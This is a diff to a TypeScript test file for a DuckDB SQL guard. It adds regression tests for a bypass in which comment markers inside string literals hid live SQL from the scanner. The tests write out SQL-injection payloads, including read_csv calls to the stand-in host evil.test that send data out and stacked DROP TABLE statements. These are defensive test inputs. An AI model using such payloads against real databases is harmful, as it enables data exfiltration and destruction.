@@ -12,11 +12,21 @@
  * where a message is asserted it is a substring confirmed to exist in
  * `duckdb.ts`. Error message text is NOT invented.
  *
- * Fixed 2026-09-01: the NETWORKISH check now runs on the pre-`stripComments`
- * text, so a networkish scheme hidden only inside a line or block comment is
- * rejected too, closing the gap between code and the design's Property 2 text
- * (previously `assertNoAbuse` tested the comment-stripped copy, so a
- * comment-only URL slipped through).
+ * Behavior discrepancies vs. the design's property text (verified in source,
+ * tests follow the CODE):
+ *   - Property 2 (networkish in a COMMENT): the guard blanks comments before
+ *     the NETWORKISH test, so a networkish scheme that appears only inside a
+ *     comment is not rejected on the networkish rule — and it is inert to
+ *     DuckDB, which discards comments in its own lexer. Networkish inside a
+ *     STRING LITERAL is still rejected (literals survive into the copy the URL
+ *     rule reads). Tests below encode this real behavior and the comment-only
+ *     case is asserted to be accepted (when otherwise safe).
+ *
+ * Properties 7–10 are the regression suite for the literal-vs-comment ordering
+ * defect: the guard used to run `stripComments` and `neutralizeStrings` as two
+ * independent regex passes, so a comment marker inside a string literal deleted
+ * live SQL from the scan copy while the original reached `conn.query()` intact.
+ * A single-pass lexer (`scanCopies` in `../duckdb`) replaced both passes.
  */
 import { describe, it, expect } from "vitest";
 import fc from "fast-check";
@@ -157,17 +167,17 @@ describe("Property 2 — networkish references are rejected (bare and inside lit
     }
   );
 
-  // Regression test for the fixed comment-hole: a networkish scheme hidden
-  // only inside a `--` or `/* */` comment must still be rejected, even though
-  // the comment itself never reaches DuckDB.
-  it("rejects a networkish scheme that appears only inside a comment", () => {
+  // DISCREPANCY (documented): networkish inside a COMMENT is stripped before the
+  // networkish test, so it is NOT rejected on the networkish rule. When the rest
+  // of the fragment is a safe read query, it is accepted. This encodes the real
+  // code behavior, contrary to the property text that says comments should also
+  // trigger rejection.
+  it("does NOT reject a networkish scheme that appears only inside a comment (documented discrepancy)", () => {
     const fragment = "SELECT 1 -- see https://example.com/notes";
-    expect(() => assertSelectOnly(fragment)).toThrow(/Remote URLs/);
-    expect(() => assertExpression(fragment)).toThrow(/Remote URLs/);
+    expect(assertSelectOnly(fragment)).toBe(fragment);
     // Block comment form.
     const block = "SELECT 1 /* https://example.com */";
-    expect(() => assertSelectOnly(block)).toThrow(/Remote URLs/);
-    expect(() => assertExpression(block)).toThrow(/Remote URLs/);
+    expect(assertSelectOnly(block)).toBe(block);
   });
 });
 
@@ -465,4 +475,220 @@ describe("Property 6 — assertIdentifier accepts exactly the bare-identifier la
       expect(assertIdentifier(`  ${good}  `)).toBe(good);
     }
   );
+});
+
+// ---------------------------------------------------------------------------
+// Property 7 (regression): a comment marker INSIDE a literal must not delete
+// live SQL from the scan copy.
+//
+// The pre-lexer guard ran `stripComments` and `neutralizeStrings` as two
+// independent regex passes, comments first. A `--` or `/*` sitting inside a
+// string literal therefore truncated the *scan copy* while the original
+// fragment — carrying an exfiltrating `read_csv('http://…')` or a stacked
+// `; DROP TABLE` — went to `conn.query()` intact. Every payload below was
+// ACCEPTED by that guard. They are the reason `scanCopies` exists.
+// ---------------------------------------------------------------------------
+describe("Property 7 — literal-borne comment markers cannot hide SQL from the scan", () => {
+  const EXFIL = "(SELECT 1 FROM read_csv('http://evil.test/x.csv'))";
+
+  // Every literal form the lexer tracks.
+  const WRAPPERS: ((m: string) => string)[] = [
+    (m) => `'${m}'`,
+    (m) => `"${m}"`,
+    (m) => `$$${m}$$`,
+    (m) => `$tag$${m}$tag$`,
+  ];
+
+  // What the marker is used to hide, and the rule that must catch it anyway.
+  const HIDDEN_TAILS: [string, RegExp][] = [
+    [`AND x = ${EXFIL}`, /Remote URLs/],
+    ["AND x = (SELECT 1 FROM read_parquet('local.parquet'))", /isn't allowed/],
+    ["; DROP TABLE dataset", /Multiple statements/],
+  ];
+
+  // The three payloads confirmed accepted by the pre-lexer guard.
+  it("rejects payload A — `--` inside a single-quoted string hiding a read_csv exfiltration", () => {
+    const a = `SELECT * FROM dataset WHERE note = 'a--' AND x = ${EXFIL}`;
+    expect(() => assertSelectOnly(a)).toThrow(/Remote URLs/);
+    expect(() => assertExpression(a)).toThrow(/Remote URLs/);
+  });
+
+  it("rejects payload B — `/*` and `*/` in separate strings straddling a read_csv exfiltration", () => {
+    const b = `SELECT * FROM dataset WHERE a = '/*' AND b = ${EXFIL} AND c = '*/'`;
+    expect(() => assertSelectOnly(b)).toThrow(/Remote URLs/);
+    expect(() => assertExpression(b)).toThrow(/Remote URLs/);
+  });
+
+  it("rejects payload C — `--` inside a string hiding a stacked DROP", () => {
+    const c = "SELECT 1 WHERE 'x--' = 'x--' ; DROP TABLE dataset";
+    expect(() => assertSelectOnly(c)).toThrow(/Multiple statements/);
+    expect(() => assertExpression(c)).toThrow(/Multiple statements/);
+  });
+
+  // Every literal form the lexer knows about, crossed with every comment
+  // marker, crossed with both attack classes. Deterministic: all generators are
+  // `constantFrom` over fixed alternatives.
+  it("rejects a hidden payload behind a marker in ANY literal form (property)", () => {
+    fc.assert(
+      fc.property(
+        // How the marker is wrapped: single-quoted string, double-quoted
+        // identifier, `$$`-quoted, `$tag$`-quoted.
+        fc.constantFrom(...WRAPPERS),
+        fc.constantFrom("--", "/*", "*/"),
+        // The two attack classes: worker-side network reach, and mutation.
+        fc.constantFrom(...HIDDEN_TAILS),
+        (wrap, marker, [tail, expected]) => {
+          const fragment = `SELECT * FROM dataset WHERE note = ${wrap(
+            marker
+          )} ${tail}`;
+          expect(() => assertSelectOnly(fragment)).toThrow(expected);
+          expect(() => assertExpression(fragment)).toThrow(expected);
+        }
+      ),
+      RUNS
+    );
+  });
+
+  it("rejects a marker inside a double-quoted identifier hiding an exfiltration (example)", () => {
+    const sql = `SELECT * FROM dataset WHERE "a--" = 1 AND x = ${EXFIL}`;
+    expect(() => assertSelectOnly(sql)).toThrow(/Remote URLs/);
+  });
+
+  it("rejects a `;` hidden behind a string-borne `--` (example)", () => {
+    const sql = "SELECT * FROM t WHERE a = 'x--' AND b = 1; DROP TABLE t";
+    expect(() => assertSelectOnly(sql)).toThrow(/Multiple statements/);
+  });
+
+  // The control case: the same exfiltration with no literal trickery was ALWAYS
+  // rejected — which is exactly why the bypass survived review for so long.
+  it("still rejects the bare control payload", () => {
+    expect(() =>
+      assertSelectOnly("SELECT * FROM read_csv('http://evil.test/x.csv')")
+    ).toThrow(/Remote URLs/);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Property 8: unterminated constructs fail closed.
+//
+// A fragment the lexer cannot finish reading is refused rather than scanned
+// half-blind: we cannot know what DuckDB would make of it, so we do not guess.
+// (The pre-lexer guard accepted all of these.)
+// ---------------------------------------------------------------------------
+describe("Property 8 — unterminated strings and comments fail closed", () => {
+  it.each([
+    ["SELECT 1 WHERE note = 'oops", "string literal"],
+    ['SELECT 1 WHERE "oops', "quoted identifier"],
+    ["SELECT 1 WHERE a = $$oops", "dollar-quoted string"],
+    ["SELECT 1 WHERE a = $tag$oops", "dollar-quoted string"],
+    ["SELECT 1 /* never closed", "block comment"],
+    ["SELECT 1 /* outer /* inner */ never closed", "block comment"],
+  ])("refuses %j (unterminated %s)", (fragment) => {
+    expect(() => assertSelectOnly(fragment)).toThrow(/Unterminated/);
+    expect(() => assertExpression(fragment)).toThrow(/Unterminated/);
+  });
+
+  it("refuses an unterminated literal whatever follows it (property)", () => {
+    fc.assert(
+      fc.property(
+        fc.constantFrom("'", '"', "$$", "$tag$"),
+        fc.constantFrom("", " AND b = 1", " FROM t", " ORDER BY a"),
+        (opener, tail) => {
+          expect(() =>
+            assertExpression(`SELECT 1 WHERE a = ${opener}unclosed${tail}`)
+          ).toThrow(/Unterminated/);
+        }
+      ),
+      RUNS
+    );
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Property 9: block comments nest, and a comment separates tokens.
+//
+// Both behaviours were verified against the @duckdb/duckdb-wasm build this app
+// ships (duckdb-eh.wasm, node-blocking target):
+//   - `SELECT 1 AS a /* x /* y */ , 999 AS boom */` returns ONE column, so the
+//     inner `*/` does not end the comment — DuckDB nests.
+//   - `SELECT 1 AS dro/*x*/p` is a parser error at "p", so a comment is a token
+//     separator, never a token join. The lexer emits a space for that reason.
+// ---------------------------------------------------------------------------
+describe("Property 9 — nested block comments and comment-as-separator match DuckDB", () => {
+  it("treats a nested block comment as one comment, so its contents are inert", () => {
+    // Everything from the first `/*` to the LAST `*/` is comment to DuckDB, so
+    // the read_csv inside it never runs and nothing leaves the browser.
+    const sql =
+      "SELECT 1 /* outer /* inner */ AND x = read_csv('http://evil.test/x.csv') */";
+    expect(assertSelectOnly(sql)).toBe(sql);
+  });
+
+  it("rejects a payload that a nested comment fails to cover", () => {
+    // The nesting does not balance — the fragment ends inside a comment.
+    expect(() =>
+      assertSelectOnly(
+        "SELECT 1 /* a /* b */ , read_csv('http://evil.test/x.csv') /* c */"
+      )
+    ).toThrow(/Unterminated/);
+    // Two plain comments with the payload live between them: still caught.
+    expect(() =>
+      assertSelectOnly(
+        "SELECT 1 /* a */ , read_csv('http://evil.test/x.csv') /* b */"
+      )
+    ).toThrow(/Remote URLs/);
+  });
+
+  it("does not fuse the tokens either side of a comment", () => {
+    // `dro/*x*/p` is `dro p` to DuckDB (a parser error there), not `drop`. The
+    // guard must not invent a `DROP` keyword that DuckDB would never see.
+    expect(assertExpression("dro/*x*/p")).toBe("dro/*x*/p");
+    // A real DROP is of course still refused.
+    expect(() => assertExpression("drop table t")).toThrow(/isn't allowed/);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// Property 10: legitimate values containing comment/statement punctuation are
+// still accepted — the fix must not cost the analyst ordinary filters.
+// ---------------------------------------------------------------------------
+describe("Property 10 — literal values containing markers are still accepted", () => {
+  it.each([
+    "SELECT * FROM dataset WHERE note = 'a--b'",
+    "SELECT * FROM dataset WHERE note = '/* not a comment */'",
+    "SELECT * FROM dataset WHERE note = 'a; b'",
+    "SELECT * FROM dataset WHERE note = 'x*/y'",
+    "SELECT * FROM dataset WHERE note = 'it''s -- fine'",
+    "SELECT * FROM dataset WHERE note = 'please drop; the mic'",
+    'SELECT "a--b" FROM dataset',
+    "SELECT $$a--b$$ AS v FROM dataset",
+    "SELECT $tag$a;b$tag$ AS v FROM dataset",
+  ])("accepts %j unchanged", (sql) => {
+    expect(assertSelectOnly(sql)).toBe(sql);
+  });
+
+  it("accepts a marker-bearing value whatever the surrounding clause (property)", () => {
+    fc.assert(
+      fc.property(
+        fc.constantFrom("--", "/*", "*/", ";", "-- /*", "*/ ;"),
+        fc.constantFrom(
+          "SELECT * FROM dataset WHERE note = ",
+          "SELECT a, b FROM dataset WHERE label <> ",
+          "SELECT count(a) FROM dataset WHERE tag = "
+        ),
+        (marker, prefix) => {
+          const sql = `${prefix}'value ${marker} more'`;
+          expect(assertSelectOnly(sql)).toBe(sql);
+        }
+      ),
+      RUNS
+    );
+  });
+
+  // A literal URL is STILL rejected, by design — keeping data local is the
+  // point. The comment/string handling is what changed, not this verdict.
+  it("still rejects a URL-shaped value inside a string (unchanged by the fix)", () => {
+    expect(() =>
+      assertSelectOnly("SELECT * FROM dataset WHERE note = 'see http://x -- fine'")
+    ).toThrow(/Remote URLs/);
+  });
 });
